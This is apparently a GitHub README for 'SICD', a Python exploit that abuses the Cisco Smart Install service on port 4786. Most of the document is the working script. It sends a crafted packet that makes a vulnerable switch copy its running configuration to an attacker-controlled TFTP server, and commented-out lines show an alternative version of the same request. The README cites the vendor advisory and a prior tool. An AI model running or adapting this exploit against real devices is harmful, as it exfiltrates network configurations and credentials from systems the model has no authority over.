# SICD
Cisco Smart Install Exploit

Cisco Smart Install is accessible through TCP port 4786 and is vulnerable to attack.  The vendor advisory can be read here

https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170214-smi

Existing exploits, e.g. Sab0tag3d SIET, have been published to exploit this vulnerability.

https://github.com/Sab0tag3d/SIET

This exploit (SICD - Smart Install Config Dumper) was adapted from the work of Sab0tag3d specifically for obtaining the running config from a vulnerable Cisco device.

```python
#!/usr/bin/python
# Smart Install Config Dumper

import socket
import time
import sys

# Vulnerable Cisco device
victim_ip = '10.1.2.3'
# IP of your TFTP server
attack_ip = '192.168.2.200'

if(len(sys.argv) == 3):
   attack_ip = sys.argv[1]
   victim_ip = sys.argv[2]

conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.settimeout(5)
try:
   conn.connect((victim_ip, 4786))

#   c1 = 'copy system:running-config flash:/config.text'
#   c2 = 'copy flash:/config.text tftp://' + attack_ip + '/' + victim_ip + '.conf'
#   c3 = ''
#   sTcp = '0' * 7 + '1' + '0' * 7 + '1' + '0' * 7 + '800000' + '40800010014' + '0' * 7 + '10' + '0' * 7 + 'fc994737866' + '0' * 7 + '0303f4'
#   sTcp = sTcp + c1.encode('hex') + '00' * (336 - len(c1))
#   sTcp = sTcp + c2.encode('hex') + '00' * (336 - len(c2))
#   sTcp = sTcp + c3.encode('hex') + '00' * (336 - len(c3))
   c1 = 'copy system:running-config tftp://' + attack_ip + '/' + victim_ip + '.conf'
   sTcp = '0' * 7 + '1' + '0' * 7 + '1' + '0' * 7 + '800000' + '40800010014' + '0' * 7 + '10' + '0' * 7 + 'fc994737866' + '0' * 7 + '0303f4'
   sTcp = sTcp + c1.encode('hex') + '00' * (336 - len(c1))
   sTcp = sTcp + '00' * 336 + '00' * 336
   
   print('[INFO]: Sending config dumper request to %s ' % victim_ip)
   conn.send(sTcp.decode('hex'))
   conn.close()
   print('[INFO]: Waiting 30 seconds for TFTP upload completion')
   time.sleep(30)

except socket.error, exc:
   print "Socket error : %s" % exc
```
